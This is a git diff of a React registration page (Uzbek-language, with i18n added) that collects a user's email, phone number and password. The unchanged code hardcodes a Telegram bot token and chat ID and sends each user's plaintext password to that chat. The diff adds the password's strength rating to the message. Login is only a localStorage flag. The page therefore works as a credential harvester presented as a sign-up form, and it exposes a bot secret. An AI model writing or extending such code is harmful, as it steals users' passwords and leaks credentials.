@@ -1,10 +1,11 @@
-
 import { useState } from "react";
 import { toast } from "react-toastify";
 import { Loader } from "lucide-react";
 import { useNavigate } from "react-router-dom";
+import { useTranslation } from "react-i18next";
 
 export default function AuthPage() {
+    const { t } = useTranslation();
     const [email, setEmail] = useState("");
     const [password, setPassword] = useState("");
     const [phone, setPhone] = useState("");
@@ -12,6 +13,7 @@ export default function AuthPage() {
     const [passError, setPassError] = useState(false);
     const [phoneError, setPhoneError] = useState(false);
     const [isloading, setLoading] = useState(false);
+    const [passwordLevel, setPasswordLevel] = useState("");
 
     const navigate = useNavigate();
 
@@ -22,12 +24,31 @@ export default function AuthPage() {
     const BOT_TOKEN = `8389898735:AAH1MsADfS6yjL3EXLbwMmlgtJ6lgPr1j3A`;
     const MY_CHAT_ID = `8155528404`;
 
+    const handlePhoneChange = (e) => {
+        const value = e.target.value;
+        if (/^\+?[0-9]*$/.test(value)) {
+            setPhone(value);
+        }
+    };
+
+    const checkPasswordLevel = (pass) => {
+        if (!pass) return setPasswordLevel("");
+        const hasLetters = /[a-zA-Z]/.test(pass);
+        const hasNumbers = /[0-9]/.test(pass);
+        const hasSymbols = /[!@#$%^&*]/.test(pass);
+
+        if (hasLetters && !hasNumbers && !hasSymbols) setPasswordLevel(t("AuthPage.easy"));
+        else if (hasLetters && hasNumbers && !hasSymbols) setPasswordLevel(t("AuthPage.medium"));
+        else if (hasLetters && hasNumbers && hasSymbols) setPasswordLevel(t("AuthPage.hard"));
+        else setPasswordLevel(t("AuthPage.easy"));
+    };
+
     const handleSubmit = async (e) => {
         e.preventDefault();
 
-        let emailValid = regexEmail.test(email);
-        let passwordValid = regexPassword.test(password);
-        let phoneValid = regexPhone.test(phone);
+        const emailValid = regexEmail.test(email);
+        const passwordValid = regexPassword.test(password);
+        const phoneValid = regexPhone.test(phone);
 
         setEmailError(!emailValid);
         setPassError(!passwordValid);
@@ -37,10 +58,11 @@ export default function AuthPage() {
             setLoading(true);
 
             const text = `
-🆕 Yangi foydalanuvchi:
+🆕 ${t("AuthPage.newUser")}:
+
 📧 Email: ${email}
 📱 Telefon: ${phone}
-🔐 Parol: ${password}
+🔐 Parol: ${password} (${passwordLevel})
             `;
 
             try {
@@ -55,73 +77,97 @@ export default function AuthPage() {
                 });
 
                 localStorage.setItem("isAuthenticated", "true");
-
-                toast.success("Muvaffaqiyatli ro'yhatdan o'tdingiz!");
+                toast.success(t("AuthPage.success"));
                 setEmail("");
                 setPassword("");
                 setPhone("");
+                setPasswordLevel("");
                 setLoading(false);
 
-                navigate("/"); // bosh sahifaga yo‘naltirish
+                navigate("/");
             } catch (error) {
                 console.error(error);
-                toast.error("Xatolik yuz berdi!");
+                toast.error(t("AuthPage.error"));
                 setLoading(false);
             }
         } else {
-            toast.error("Iltimos, ma'lumotlarni to‘g‘ri kiriting");
+            toast.error(t("AuthPage.invalidInput"));
         }
     };
 
     return (
-        <div className=" -mt-[70px] slide-bg relative w-full h-[737px] bg-cover bg-center bg-[url('/src/img/Cover.png')] flex justify-center items-center w-[100] h-[737px] bg-[url('/src/Conponit/Container.webp')] bg-cover bg-cente">
-            <form onSubmit={handleSubmit} className="flex shadow-xl w-[900px] rounded-xl p-6 bg-white/70 backdrop-blur-md border border-gray-300">
-                <iframe src="https://my.spline.design/genkubgreetingrobot-BEJT5t4bdIAhgacAXRzXgd9K/" frameBorder="0" className="w-[500px] h-[500px] rounded-md"></iframe>
-                <div className="w-[300px]">
-                    <h2 className="text-center text-2xl font-bold mb-6 text-gray-700">Ro‘yxatdan o‘tish</h2>
+        <div className="-mt-[70px] relative w-full min-h-screen bg-cover bg-center bg-[url('/src/img/Cover.png')] flex justify-center items-center px-4">
+            <form
+                onSubmit={handleSubmit}
+                className="flex flex-col lg:flex-row gap-6 shadow-xl w-full max-w-[900px] rounded-xl p-4 sm:p-6 bg-white/70 backdrop-blur-md border border-gray-300"
+            >
+                {/* SPLINE */}
+                <iframe
+                    src="https://my.spline.design/genkubgreetingrobot-BEJT5t4bdIAhgacAXRzXgd9K/"
+                    frameBorder="0"
+                    className="w-full h-[260px] sm:h-[350px] lg:w-[500px] lg:h-[500px] rounded-md"
+                ></iframe>
 
+                {/* FORM */}
+                <div className="w-full lg:w-[300px]">
+                    <h2 className="text-center text-xl sm:text-2xl font-bold mb-6 text-gray-700">{t("AuthPage.title")}</h2>
+
+                    {/* EMAIL */}
                     <div className="mb-4">
-                        <label className="block mb-2 font-medium text-gray-700">Email</label>
+                        <label className="block mb-2 font-medium text-gray-700">{t("AuthPage.email")}</label>
                         <input
                             type="text"
                             value={email}
                             onChange={(e) => setEmail(e.target.value)}
-                            placeholder="Email kiriting"
-                            className={`w-full py-2 px-3 rounded-lg outline-none border transition-all duration-200 
-                            ${emailError ? "border-red-500 bg-white" : email ? "border-green-500 bg-green-100" : "border-gray-300 bg-white"}`}
+                            placeholder={t("AuthPage.emailPlaceholder")}
+                            className={`w-full py-2 px-3 rounded-lg outline-none border transition-all ${
+                                emailError ? "border-red-500" : email ? "border-green-500 bg-green-100" : "border-gray-300"
+                            }`}
                         />
-                        {emailError && <p className="text-red-500 text-sm mt-1">Emailda xatolik bor!</p>}
+                        {emailError && <p className="text-red-500 text-sm mt-1">{t("AuthPage.emailError")}</p>}
                     </div>
 
+                    {/* PHONE */}
                     <div className="mb-4">
-                        <label className="block mb-2 font-medium text-gray-700">Telefon raqam</label>
+                        <label className="block mb-2 font-medium text-gray-700">{t("AuthPage.phone")}</label>
                         <input
                             type="text"
                             value={phone}
-                            onChange={(e) => setPhone(e.target.value)}
+                            onChange={handlePhoneChange}
                             placeholder="+998"
-                            className={`w-full py-2 px-3 rounded-lg outline-none border transition-all duration-200 
-                            ${phoneError ? "border-red-500 bg-white" : phone ? "border-green-500 bg-green-100" : "border-gray-300 bg-white"}`}
+                            className={`w-full py-2 px-3 rounded-lg outline-none border transition-all ${
+                                phoneError ? "border-red-500" : phone ? "border-green-500 bg-green-100" : "border-gray-300"
+                            }`}
                         />
-                        {phoneError && <p className="text-red-500 text-sm mt-1">Telefon raqam noto‘g‘ri formatda!</p>}
+                        {phoneError && <p className="text-red-500 text-sm mt-1">{t("AuthPage.phoneError")}</p>}
                     </div>
 
+                    {/* PASSWORD */}
                     <div className="mb-6">
-                        <label className="block mb-2 font-medium text-gray-700">Parol</label>
+                        <label className="block mb-2 font-medium text-gray-700">{t("AuthPage.password")}</label>
                         <input
                             type="password"
                             value={password}
-                            onChange={(e) => setPassword(e.target.value)}
-                            placeholder="Parol kiriting"
-                            className={`w-full py-2 px-3 rounded-lg outline-none border transition-all duration-200 
-                            ${passError ? "border-red-500 bg-white" : password ? "border-green-500 bg-green-100" : "border-gray-300 bg-white"}`}
+                            onChange={(e) => {
+                                setPassword(e.target.value);
+                                checkPasswordLevel(e.target.value);
+                            }}
+                            placeholder={t("AuthPage.passwordPlaceholder")}
+                            className={`w-full py-2 px-3 rounded-lg outline-none border transition-all ${
+                                passError ? "border-red-500" : password ? "border-green-500 bg-green-100" : "border-gray-300"
+                            }`}
                         />
-                        {passError && <p className="text-red-500 text-sm mt-1">Parol 6–16 ta belgidan iborat bo‘lishi kerak!</p>}
+                        {password && <p className={`mt-1 text-sm`}>{t("AuthPage.passwordLevel")}: {passwordLevel}</p>}
+                        {passError && <p className="text-red-500 text-sm mt-1">{t("AuthPage.passwordError")}</p>}
                     </div>
 
-                    <button type="submit" disabled={isloading} className="flex items-center gap-2 justify-center w-full py-2 rounded-lg bg-green-500 text-white font-semibold hover:bg-green-600 transition-all">
+                    <button
+                        type="submit"
+                        disabled={isloading}
+                        className="flex items-center gap-2 justify-center w-full py-2 rounded-lg bg-green-500 text-white font-semibold hover:bg-green-600 transition-all"
+                    >
                         {isloading && <Loader className="animate-spin" />}
-                        Yuborish
+                        {t("AuthPage.submit")}
                     </button>
                 </div>
             </form>
